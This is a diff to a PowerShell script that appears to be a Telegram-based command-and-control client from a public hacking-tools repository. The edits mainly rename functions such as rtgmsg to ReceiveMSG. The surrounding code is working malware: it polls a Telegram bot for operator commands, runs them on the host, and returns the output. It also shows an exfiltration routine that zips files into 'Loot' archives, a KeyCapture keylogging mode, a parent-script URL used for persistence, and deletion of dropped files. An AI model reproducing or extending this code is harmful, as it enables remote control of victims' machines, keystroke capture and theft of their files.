@@ -15,17 +15,13 @@ SEE README FOR MORE INFO
 # Define User Variables
 $Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token
 #-----------------------------------------------------------------------------------------------------------
-
 # Define Connection Variables
 $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
 $global:errormsg = 0 # 1 = return error messages to chat (off by default)
 $parent = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
-$URL='https://api.telegram.org/bot{0}' -f $Token
-$apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $AcceptedSession=""
 $LastUnAuthenticatedMessage=""
 $lastexecMessageID=""
-
 # Emoji characters
 $tick = [char]::ConvertFromUtf32(0x2705)
 $comp = [char]::ConvertFromUtf32(0x1F4BB)
@@ -34,7 +30,6 @@ $waiting = [char]::ConvertFromUtf32(0x1F55C)
 $glass = [char]::ConvertFromUtf32(0x1F50D)
 $cmde = [char]::ConvertFromUtf32(0x1F517)
 $pause = [char]::ConvertFromUtf32(0x23F8)
-
 # remove pause files
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.ps1"){rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force}
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force}
@@ -42,11 +37,13 @@ if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){rm -path "$env:APPDATA\M
 Sleep 5
 if(Test-Path "C:\Windows\Tasks\service.vbs"){rm -path "C:\Windows\Tasks\service.vbs" -Force}
 # Get Chat ID from the bot
+$apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
+$URL = 'https://api.telegram.org/bot{0}' -f $Token
 $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
 if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
 if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
-$MessageToSend = New-Object psobject 
-$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
+$Mts = New-Object psobject 
+$Mts | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
 # Collect script contents
 $scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
 #----------------------------------------------- ON START ------------------------------------------------------
@@ -55,6 +52,14 @@ $contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 #----------------------------------------------- ACTION FUNCTIONS ----------------------------------------------
+
+Function Close{
+$contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
+$params = @{chat_id = $ChatID ;text = $contents}
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+rm -Path "$env:temp/tgc2.txt" -Force
+exit
+}
 
 Function Options{
 $contents = "==============================================
@@ -120,14 +125,6 @@ $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 }
 
-Function Close{
-$contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
-$params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
-rm -Path "$env:temp/tgc2.txt" -Force
-exit
-}
-
 Function Upload{
 param ([string[]]$Path)
 if (Test-Path -Path $path){
@@ -177,7 +174,7 @@ foreach ($folder in $foldersToSearch) {
                 $index++
                 $zipFilePath ="$env:temp/Loot$index.zip"
                 $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
-                $messages=rtgmsg
+                $messages=ReceiveMSG
                     if ($messages.message.text -contains "kill") {
                     $contents = "$comp $env:COMPUTERNAME $closed Exfiltration Killed"
                     $params = @{chat_id = $ChatID ;text = $contents}
@@ -247,7 +244,7 @@ While ($true){
                 }
             }
         }
-        $messages=rtgmsg
+        $messages=ReceiveMSG
         if ($messages.message.text -contains "kill") {
         $contents = "$comp $env:COMPUTERNAME $closed KeyCapture Killed"
         $params = @{chat_id = $ChatID ;text = $contents}
@@ -556,7 +553,7 @@ param($CheckMessage)
     }Else{return 0}
 }
 
-Function StrmFX{
+Function CleanString{
 param($Stream)
 $FixedResult=@()
 $Stream | Out-File -FilePath (Join-Path $env:temp -ChildPath "tgc2.txt") -Force
@@ -569,16 +566,16 @@ foreach ($line in $ReadAsArray){
 return $FixedResult
 }
 
-Function stgmsg{
+Function SendMSG{
 param($Messagetext,$ChatID)
-$FixedText=StrmFX -Stream $Messagetext
-$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line -Force
-$JsonData=($MessageToSend | ConvertTo-Json)
+$FixedText=CleanString -Stream $Messagetext
+$Mts | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line -Force
+$JsonData=($Mts | ConvertTo-Json)
 irm -Method Post -Uri ($URL +'/sendMessage') -Body $JsonData -ContentType "application/json"
 $catcher = $FixedText
 }
 
-Function rtgmsg{
+Function ReceiveMSG{
 try{
     $inMessage=irm -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
     return $inMessage.result[-1]
@@ -590,7 +587,7 @@ Catch{return "TGFail"}
 
 While ($true){
 Sleep 2
-$messages=rtgmsg
+$messages=ReceiveMSG
     if ($LastUnAuthMsg -like $null){$LastUnAuthMsg=$messages.message.date}
     if (!($AcceptedSession)){$CheckAuthentication=IsAuth -CheckMessage $messages}
     Else{
@@ -600,11 +597,11 @@ $messages=rtgmsg
                 $Result
                 if (($result.length -eq 0) -or ($messages.message.text -contains "KeyCapture") -or ($messages.message.text -contains "Exfiltration")){}
                 else{
-                stgmsg -Messagetext $Result -ChatID $messages.message.chat.id
+                SendMSG -Messagetext $Result -ChatID $messages.message.chat.id
                 }
                 }catch {
                     if($global:errormsg -eq 1){
-                    stgmsg -Messagetext ($_.exception.message) -ChatID $messages.message.chat.id
+                    SendMSG -Messagetext ($_.exception.message) -ChatID $messages.message.chat.id
                     }
                 }
             Finally{$lastexecMessageID=$messages.message.date}
